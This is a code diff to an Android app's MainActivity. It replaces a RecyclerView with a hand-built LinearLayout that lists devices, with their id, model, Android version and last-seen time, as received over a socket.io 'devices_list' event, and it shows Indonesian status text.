@@ -2,24 +2,19 @@ package com.testapp;
 
 import android.app.Activity;
 import android.os.Bundle;
-import android.os.Handler;
+import android.view.Gravity;
+import android.widget.LinearLayout;
 import android.widget.TextView;
-import androidx.recyclerview.widget.LinearLayoutManager;
-import androidx.recyclerview.widget.RecyclerView;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.net.URISyntaxException;
-import java.util.ArrayList;
-import java.util.List;
 
 public class MainActivity extends Activity {
     private Socket socket;
     private TextView statusText;
-    private RecyclerView recyclerView;
-    private DeviceAdapter adapter;
-    private Handler handler = new Handler();
+    private LinearLayout deviceContainer;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -27,11 +22,7 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
 
         statusText = findViewById(R.id.statusText);
-        recyclerView = findViewById(R.id.deviceRecycler);
-        recyclerView.setLayoutManager(new LinearLayoutManager(this));
-        adapter = new DeviceAdapter(new ArrayList<>());
-        recyclerView.setAdapter(adapter);
-
+        deviceContainer = findViewById(R.id.deviceContainer);
         statusText.setText("⏳ Menghubungkan...");
 
         try {
@@ -51,13 +42,45 @@ public class MainActivity extends Activity {
         socket.on("devices_list", args -> {
             try {
                 JSONArray devices = (JSONArray) args[0];
-                List<JSONObject> deviceList = new ArrayList<>();
-                for (int i = 0; i < devices.length(); i++) {
-                    deviceList.add(devices.getJSONObject(i));
-                }
                 runOnUiThread(() -> {
-                    adapter.update(deviceList);
-                    statusText.setText("🟢 ONLINE | " + deviceList.size() + " perangkat");
+                    deviceContainer.removeAllViews();
+                    for (int i = 0; i < devices.length(); i++) {
+                        try {
+                            JSONObject dev = devices.getJSONObject(i);
+                            // Buat item
+                            LinearLayout item = new LinearLayout(MainActivity.this);
+                            item.setOrientation(LinearLayout.VERTICAL);
+                            item.setBackgroundColor(0xFF1a1a1a);
+                            item.setPadding(24, 24, 24, 24);
+                            LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
+                                    LinearLayout.LayoutParams.MATCH_PARENT,
+                                    LinearLayout.LayoutParams.WRAP_CONTENT
+                            );
+                            params.setMargins(0, 0, 0, 16);
+                            item.setLayoutParams(params);
+
+                            TextView idView = new TextView(MainActivity.this);
+                            idView.setText("🆔 " + dev.getString("id"));
+                            idView.setTextColor(0xFF00ff41);
+                            idView.setTextSize(16);
+
+                            TextView modelView = new TextView(MainActivity.this);
+                            modelView.setText("📱 " + dev.getString("model") + " | Android " + dev.optString("android", "??"));
+                            modelView.setTextColor(0xFFFFFFFF);
+                            modelView.setTextSize(14);
+
+                            TextView lastView = new TextView(MainActivity.this);
+                            lastView.setText("🕒 " + dev.optString("last_seen", "unknown"));
+                            lastView.setTextColor(0xFFAAAAAA);
+                            lastView.setTextSize(12);
+
+                            item.addView(idView);
+                            item.addView(modelView);
+                            item.addView(lastView);
+                            deviceContainer.addView(item);
+                        } catch (Exception e) {}
+                    }
+                    statusText.setText("🟢 ONLINE | " + devices.length() + " perangkat");
                 });
             } catch (Exception e) {
                 runOnUiThread(() -> statusText.setText("⚠️ Error parsing data"));
